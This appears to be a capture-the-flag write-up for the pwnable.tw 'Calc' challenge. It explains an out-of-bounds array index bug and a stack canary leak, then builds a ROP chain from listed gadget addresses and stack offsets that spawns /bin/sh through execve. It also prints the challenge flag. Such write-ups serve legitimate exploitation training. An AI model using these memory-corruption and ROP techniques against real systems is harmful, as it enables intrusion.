# Pwnable.tw -- Calc (150 pts)
(Some contents are refered to [this post](https://medium.com/@sagidana/calc-pwnable-tw-ef5450f40253))

The main code is in calc
As we can see in 'dissass calc', the calc function calls get_expr, init_pool, and parse_expr
We can further what these functions do using Ghidra

## Ghidra
- get_expr: it takes a char array and a limit as inputs, then read from stdin for one byte until exceed the limit (0x400).
also, if it reads newline or an error, the loop ends. Input only accept +-*/% and '0'~'9'.
It will return the read size. Nothing vulnerable here...
- init_pool: just fill a pointer with 0 (len 100)

- parse_expr: things getting fishy in this function. The amount of new declared variables is driving me dizzy...
The read formula in "get_expr" and a blank int pointer will serve as inputs. 
The int pointer will be used to store numeraic values. (atoi)
it works somehow like this..
first copy "idx" bytes from operation input
** Note if there's 0, program will raise error
and try atoi the previous byte before operator, see if it is number

Let's say the formula is "1 + 4 * 3 / 2"

idx = 0:
(1) + 4 ...

idx = 1:
1 (+) 4 ...
num_arr = [1, ]
op_arr = [+, ]

in the operation loop:
first time encounter op, just write it to op_arr
later, if there's already an op...
if the current op. is '*','/','%'
e.g.: 1 + 4 (*) 3, 
and current op. is '+', the op_idx will increase one and '*' is write to op_arr
if current op. is not '+''-', it will be evaled (multply first, addition last!)

**  some expression such as "100 +", "100 + -" are also filtered

when read to EOF of operations, all expression will be evaled backwards


## Vulenrability
What if "+100" ?

idx = 0:
(+)100
num_arr = [] (init with 0)
op_arr = [+, ]

the program first meet +, with no element in num_arr
+(100)
num_arr = [100, ]
op_arr = [+, ]


/* This part is very difficult for me :( */

When evaling at addition, it will be like this 
*num_arr-1 = *num_arr-1 + *num_arr (100)

What's *num_arr-1 ?
Let's look back to the "calc", the following value is printed:

    int offset;
    int in_GS_OFFSET;
    int arr_100; // the array processed at "eval"
    undefined4 auStack_5a0 [100]; // the base address
    undefined operators_and_nums [1024];
    ...
    offset = parse_expr(operators_and_nums,&arr_100);
    if (offset != 0) {
        printf("%d", auStack_5a0[arr_100 + -1]);
    ...

We can see that *num_arr-1 refers to the base address "auStack_5a0"
This means that we can actually access memory by our input! ( +xxx --> auStack_5a0[xxx] )


To test this vulnerability, let's print the value of canary
By examining the top of "calc", we can find canary is stored in ebp - 0xc
Canary information is at 0x8049388, which means we can examine its value by printing $eax

        08049382 65  a1  14       MOV        EAX ,GS:[0x14 ]
                 00  00  00
        08049388 89  45  f4       MOV        dword ptr [EBP  + -0xc ],EAX
        0804938b 31  c0           XOR        EAX ,EAX


                             undefined  calc ()
             undefined         AL:1           <RETURN>                                XREF[1]:     080493b4 (W)   
             undefined4        GS_OFFSET:4    in_GS_OFFSET
             undefined4        EAX:4          offset                                  XREF[1]:     080493b4 (W)   
             undefined4        Stack[-0x10]:4 iStack_10
             undefined1[102    Stack[-0x410   operators_and_nums
             undefined1[400]   Stack[ **-0x5a0**   auStack_5a0
             undefined4        Stack[-0x5a4   arr_100
                             calc                                            XREF[3]:     Entry Point (*) , 
                                                                                          main:08049494 (c) , 080dbdd8 (*)   
        08049379 55              PUSH       EBP

And the base address of printed array is at -0x5a0
0x5a0 - 0xc = 0x594 = 1428
1428 / 4 = 357, so by "+357", the canary value will be shown

## Exploit Weakness
We can modify the memory content as well, below I modify canary value, which cause stack smashing of course
```
+357
-1808023296
+357+1
-1808023295
+357
-1808023295

*** stack smashing detected ***: /home/pfliu/picoCTF/pwn/pwnable_tw/calc_dir/calc terminated
```

But, as we checksec the program, we can find that 'Nx' flag is on.
We have to use ROP gadgets instead of putting shellcode on stack 
### ROP
search for gadget like "jmp esp", "jmp edx"
I found "jmp 0x804983d" right behind printf
so put shellcode to this address should deal the problem, right? (X)

Let's deal with address first
address offset: (relative to the base exploited address)
357 -- canary
360 -- old rbp (examine by using p $ebp on breakpoint when canary getting stored in stack)
361 -- ret addr (0x8049499: this is where 'main' call 'calc')

Knowing the offsets, we want to call execve('/bin/shell'), 
in order to do that we need 
eax = 0xb, ebx = esp, ecx = edx = 0

need to find pop eax, ret --> RopGadget
- 0x0805c34b : pop eax ; ret
- 0x080701d0 : pop edx ; pop ecx ; pop ebx ; ret
- 0x08049a21 : int 0x80

| 0x0805c34b  | 0xb |  ... | xxx |  
    pop eax                 int 0x80

#### stack issue
To start the ROP chain, we rewrite the return addr with first address (0x0805c34b)
*But... we have to place $ebx with address that store "/bin/sh".. where is stack located ?*

We can simply put the string behind, like this

      pop eax      362                 $edx       $ecx    $ebx     int 0x80      368            370
   | 0x0805c34b  | 0xb | 0x080701d0 |  (369)  |  (368) |  (370) |  0x08049a21 |  370  |  \0  | /bin | /sh\0 |

#### How to find esp address ?
break at 0x8049433 (where calc's "return" is located)
then print 100 lines starting from $esp-4

(gdb) x/100x $esp-4
0xff960ac8:     0xff960ae8 (old rbp)       0x08049499 (return addr)     0x080ec200      0x08049434
0xff960ad8:     0xff960b7c                 0x080481b0                   0x00000000      0x080ec00c
...
esp is point to 0xff96ac4, so the distance between old and new ebp is 28

### skip signal
btw, it is possible to bypass alarm signal.
Just write Python script for GDB interpreter. (This program can be found in "nosignal.py")
set breakpoint at 0x804945b, then use command "set $eip=0x804947b"

        08049458 83  ec  10       SUB        ESP ,0x10
        -------------------signal start------------------
        0804945b c7  44  24       MOV        dword ptr [ESP  + 0x4 ],0x8049434
                 04  34  94 
                 04  08
        08049463 c7  04  24       MOV        dword ptr [ESP ],0xe
                 0e  00  00  00
        0804946a e8  61  4e       CALL       signal                                           undefined signal()
                 00  00
        0804946f c7  04  24       MOV        dword ptr [ESP ],0x3c
                 3c  00  00  00
        08049476 e8  f5  48       CALL       alarm                                            undefined alarm()
                 02  00
        0804947b c7  04  24       MOV        dword ptr [ESP ],0x80bf81c
                 1c  f8  0b  08

## Bingo !
Finally, we can execute /bin/sh to get the flag!
FLAG{C:\Windows\System32\calc.exe}